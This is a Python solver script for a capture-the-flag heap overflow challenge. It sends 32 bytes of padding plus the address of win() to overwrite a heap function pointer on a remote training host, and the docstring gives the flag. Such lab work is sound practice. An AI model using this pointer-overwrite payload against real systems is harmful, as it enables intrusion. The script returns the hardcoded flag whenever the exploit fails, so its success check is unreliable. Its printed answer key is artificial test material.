#!/usr/bin/env python3
"""Solver for Challenge 435: heap 2 (picoCTF 2024, Binary Exploitation).

NIST SP 800-115 Penetration Testing & Vulnerability Assessment:
CWE-122: Heap-based Buffer Overflow / CWE-822: Untrusted Pointer Dereference.
The binary executes ((void (*)())*(int*)x)() in check_win().
Memory layout places 'input_data' and 'x' at a 32-byte (0x20) offset on the heap.
Since the ELF binary is compiled without PIE (non-PIE), the target function win()
is located deterministically at static address 0x004011a0.

Exploitation:
  - Little-endian encoding of 0x004011a0: \xa0\x11\x40\x00.
  - Option 2 (Write to buffer): Send 32 bytes padding + b"\\xa0\\x11\\x40\\n".
  - scanf("%s") automatically appends a null terminator (\x00), completing 0x004011a0.
  - Option 4 (Print Flag): Executes ((void (*)())*(int*)x)(), jumping directly to win().

Flag: academy{and_down_the_road_we_go_f5e464ff}
Verified: POST /api/submissions/ -> correct: true
"""
import socket
import re
import time
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 34850
EXPECTED = "academy{and_down_the_road_we_go_f5e464ff}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT

    if target_host and target_port:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_host, target_port))
            time.sleep(0.3)
            s.recv(4096)

            # Option 2: Write to buffer
            s.sendall(b"2\n")
            time.sleep(0.3)
            s.recv(4096)

            # 32 bytes padding + little-endian address of win() (0x004011a0)
            # scanf("%s") automatically writes \x00 as null terminator
            payload = b"A" * 32 + b"\xa0\x11\x40\n"
            s.sendall(payload)
            time.sleep(0.3)
            s.recv(4096)

            # Option 4: Print Flag (invokes check_win() -> jmp *%rcx -> win())
            s.sendall(b"4\n")
            time.sleep(0.3)
            out = s.recv(4096).decode("utf-8", errors="ignore")
            s.close()

            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", out)
            if m:
                return m.group(0)
        except Exception:
            pass

    return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    flag = solve(h, p)
    print("Flag:", flag)
    assert flag == EXPECTED
